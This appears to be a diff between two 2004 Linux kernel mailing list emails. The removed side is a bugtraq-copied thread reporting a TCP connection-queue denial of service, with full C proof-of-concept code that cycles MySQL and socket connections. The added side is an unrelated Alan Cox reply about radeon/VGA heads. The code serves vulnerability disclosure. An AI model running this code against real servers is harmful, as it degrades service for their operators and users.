@@ -1,248 +1,52 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S266271AbUIMRqV@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S267701AbUIMRsG@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S266271AbUIMRqV (ORCPT <rfc822;willy@w.ods.org>);
-	Mon, 13 Sep 2004 13:46:21 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S267686AbUIMRqU
+	id S267701AbUIMRsG (ORCPT <rfc822;willy@w.ods.org>);
+	Mon, 13 Sep 2004 13:48:06 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S267709AbUIMRsF
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Mon, 13 Sep 2004 13:46:20 -0400
-Received: from icicle.winternet.com ([198.174.169.13]:15796 "EHLO
-	icicle.winternet.com") by vger.kernel.org with ESMTP
-	id S266271AbUIMRqK (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Mon, 13 Sep 2004 13:46:10 -0400
-Date: Mon, 13 Sep 2004 12:46:00 -0500 (CDT)
-From: Ron DuFresne <dufresne@winternet.com>
-To: Wolfpaw - Dale Corse <admin@wolfpaw.net>
-cc: davem@davemloft.net, <linux-kernel@vger.kernel.org>,
-       <grsecurity@grsecurity.net>, <bugtraq@securityfocus.com>
-Subject: RE: Linux 2.4.27 SECURITY BUG - TCP Local (probable Remote) Denial
- of Service
-In-Reply-To: <000001c49872$99333460$0200a8c0@wolf>
-Message-ID: <Pine.GSO.4.43.0409131244080.14506-100000@tundra.winternet.com>
-X-Admonition: The Good thing about potential is
-X-Admonition2: as long as you do nothing
-X-Admonition3: you'll always have it.
-MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+	Mon, 13 Sep 2004 13:48:05 -0400
+Received: from clock-tower.bc.nu ([81.2.110.250]:10683 "EHLO
+	localhost.localdomain") by vger.kernel.org with ESMTP
+	id S267701AbUIMRru (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Mon, 13 Sep 2004 13:47:50 -0400
+Subject: Re: radeon-pre-2
+From: Alan Cox <alan@lxorguk.ukuu.org.uk>
+To: Jon Smirl <jonsmirl@gmail.com>
+Cc: Dave Airlie <airlied@linux.ie>,
+       Felix =?ISO-8859-1?Q?K=FChling?= <fxkuehl@gmx.de>,
+       DRI Devel <dri-devel@lists.sourceforge.net>,
+       lkml <linux-kernel@vger.kernel.org>, Linus Torvalds <torvalds@osdl.org>
+In-Reply-To: <9e47339104091309281c4e6fb7@mail.gmail.com>
+References: <E3389AF2-0272-11D9-A8D1-000A95F07A7A@fs.ei.tum.de>
+	 <9e47339104091011402e8341d0@mail.gmail.com>
+	 <Pine.LNX.4.58.0409102254250.13921@skynet>
+	 <1094853588.18235.12.camel@localhost.localdomain>
+	 <Pine.LNX.4.58.0409110137590.26651@skynet>
+	 <1094912726.21157.52.camel@localhost.localdomain>
+	 <Pine.LNX.4.58.0409122319550.20080@skynet>
+	 <1095074778.14374.41.camel@localhost.localdomain>
+	 <9e47339104091308063c394704@mail.gmail.com>
+	 <1095087860.14582.37.camel@localhost.localdomain>
+	 <9e47339104091309281c4e6fb7@mail.gmail.com>
+Content-Type: text/plain
+Content-Transfer-Encoding: 7bit
+Message-Id: <1095093816.14586.51.camel@localhost.localdomain>
+Mime-Version: 1.0
+X-Mailer: Ximian Evolution 1.4.6 (1.4.6-2) 
+Date: Mon, 13 Sep 2004 17:43:56 +0100
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
+On Llu, 2004-09-13 at 17:28, Jon Smirl wrote:
+> Doesn't the base platform need to be designed to also treat individual
+> heads as resources?
 
-others will correct me if I'm wrong, but, I beleive one can tune this with
-sysctl params, and lower the time limits such to minimise problems.  But
-also, issues like this are long known, and not limited to linux nor the
-current stable kernel.
+Already covered - although at the moment the question is open about who
+tells the vga generic code "It has 4 heads" ?
 
-Thanks,
+Had a look over your class code - its nice and it should integrate
+really easily as well as remove most of the PCI layer patching it now
+does.
 
-Ron DuFresne
-
-On Sat, 11 Sep 2004, Wolfpaw - Dale Corse wrote:
-
-> Hi David,
->
-> Hmm.. I was more looking for the correct kernel developer to send
-> it to, rather then just releasing exploit code into the wild, and
-> having it end up a zero day hack. It was not in any way my intention
-> to waste anyone's time. I will however, comply with your politely
-> stated request :)
->
-> As for it being an application bug - it may be one in Mysql not
-> closing the sockets, but it is a Kernel Bug that allows CLOSE_WAIT
-> sockets to clog up the connection queues, and cause a DOS conditions
-> on other applications (such as Apache). Since most software used for
-> denial of service is badly written (intentionally) to exploit the
-> holes, the error should be fixed, not blamed on faulty software.
->
-> That being said - below is a the proper description, and the code
-> used to exploit it. Hope it helps. This version is not the one
-> which invokes the CLOSE_WAIT state, but rather the TIME_WAIT one,
-> I am not able to publish the source code for the CLOSE_WAIT bug.
-> The log however clearly shows that a mysql descriptor is closed,
-> and then used immediately again by the socket call, which causes it
-> never to end up getting closed. Linux apparently has either no
-> timeout for CLOSE_WAIT, or it's a very very long one.. Either way
-> is a bad thing.
->
-> D.
->
-> Description
-> =============
-> The "socket" call will reuse file descriptor before it is completely
-> finished closing. In this case, it is Mysql (3.23.58) which doesn't
-> appear to close them right away, and thus you end up with the
-> result I mentioned.
->
-> Proof Of Concept Code:
-> ======================
-> #include <sys/types.h>
-> #include <time.h>
-> #include <sys/stat.h>
-> #include <ctype.h>
-> #include <errno.h>
-> #include <stdio.h>
-> #include <time.h>
-> #include <string>
-> #include <fcntl.h>
-> #include <signal.h>
-> #include <stdarg.h>
-> #include <sys/resource.h>
-> #include <sys/wait.h>
-> #include <stdlib.h>
-> #include <sys/time.h>
-> #include <unistd.h>
-> #include <sys/socket.h>
-> #include <netinet/in.h>
-> #include <netinet/in_systm.h>
-> #include <netinet/ip.h>
-> #include <arpa/inet.h>
-> #include <arpa/telnet.h>
-> #include <netdb.h>
-> #include "mysql.h"
->
-> int main (int argc, char **argv)
-> {
->
-> char *sql_host = "127.0.0.1";
-> char *sql_name = "root";
-> char *sql_pass = "<PASS>";
-> char *sql_socket = NULL;
-> int sql_port = <PORT>;
-> char *c_host = "127.0.0.1";
-> int c_port=80;
-> long sock=0;
-> int connectresult=0;
-> struct sockaddr_in sockaddr;
-> MYSQL mysql;
-> MYSQL mysql2;
->
-> mysql_init(&mysql);
-> mysql_init(&mysql2);
->
-> if (!mysql_real_connect (&mysql2, sql_host, sql_name,
-> sql_pass,NULL,sql_port,sql_socket,0))
->     {
->       printf ("SQL-ERROR connecting to database: %s",
->                mysql_error (&mysql));
->       exit(1);
->     }
->
-> printf("Mysql Socket Connected: %d\n",mysql.net.fd);
->
-> while(1)
-> {
->
-> /* Close the SQL connection */
-> mysql_close(&mysql);
->
-> mysql_init(&mysql);
-> if (!mysql_real_connect (&mysql, sql_host, sql_name,
-> sql_pass,NULL,sql_port,sql_socket,0))
->     {
->       printf ("SQL-ERROR connecting to database: %s",
->                mysql_error (&mysql));
->       exit(1);
->     }
->
-> printf("Mysql Socket Connected: %d\n",mysql.net.fd);
->
-> sockaddr.sin_addr.s_addr=inet_addr(c_host);
-> sockaddr.sin_port=htons(c_port);
->
->   if((sock=socket(AF_INET, SOCK_STREAM, 0))<0)
->     printf("socket failed.");
->
-> sockaddr.sin_family=AF_INET;
->
-> printf("Connecting to %s:%d (FD: %ld)... ",c_host,c_port,sock);
-> connectresult=connect(sock,(struct sockaddr *) &sockaddr, sizeof(sockaddr));
->
-> if(connectresult) {
->    close(sock);
->
->      switch(errno) {
->        case ECONNREFUSED:
->          printf(" CONNECTION REFUSED.\n");
->          break;
->        case ENETUNREACH:
->          printf(" HOST UNREACHABLE.\n");
->          break;
->        default:
->          printf(" FAILED: UNKNOWN ERROR");
->      }
-> }
-> else
-> {
-> printf(" Connected.\n");
-> }
->
-> mysql_close(&mysql2);
->
-> /* Make a Mysql Connection */
-> mysql_init(&mysql2);
-> if (!mysql_real_connect (&mysql2, sql_host, sql_name,
-> sql_pass,NULL,sql_port,sql_socket,0))
->     {
->       printf ("SQL-ERROR connecting to database: %s",
->                mysql_error (&mysql2));
->       exit(1);
->     }
->
-> printf("Mysql Socket Connected: %d\n",mysql2.net.fd);
->
-> /* Close the socket connection */
-> printf("Closing socket #%ld",sock);
-> close(sock);
-> }
->
-> }
->
-> > -----Original Message-----
-> > From: David S. Miller [mailto:davem@davemloft.net]
-> > Sent: Saturday, September 11, 2004 7:12 PM
-> > To: admin@wolfpaw.net
-> > Cc: linux-kernel@vger.kernel.org; grsecurity@grsecurity.net;
-> > bugtraq@securityfocus.com
-> > Subject: Re: Linux 2.4.27 SECURITY BUG - TCP Local (probable
-> > Remote) Denial of Service
-> >
-> >
-> >
-> > Close wait means the application locally has not closed
-> > the file descriptor, yet the remote end has sent
-> > a FIN.
-> >
-> > This is %99 of the time an application bug.
-> >
-> > But since you haven't provided much detail of the problem
-> > nobody will ever know exactly what you're talking about.
-> >
-> > Please, do me and everyone else here on this list a real huge
-> > favor, don't post bug reports without all the details, you're
-> > just wasting everyone's time.  If it's exploitable, even more
-> > reason to post every single detail so we can work on a fix if
-> > necessary as fast as possible.
-> >
-> > --------------------------------------------------------------
-> > --------------
-> > -
-> > This message has been scanned for Spam and Viruses by ClamAV
-> > and SpamAssassin
-> > --------------------------------------------------------------
-> > --------------
-> > -
-> >
-> >
-> >
-> >
-> >
->
-
--- 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-"Cutting the space budget really restores my faith in humanity.  It
-eliminates dreams, goals, and ideals and lets us get straight to the
-business of hate, debauchery, and self-annihilation." -- Johnny Hart
-	***testing, only testing, and damn good at it too!***
-
-OK, so you're a Ph.D.  Just don't touch anything.
+Alan
 
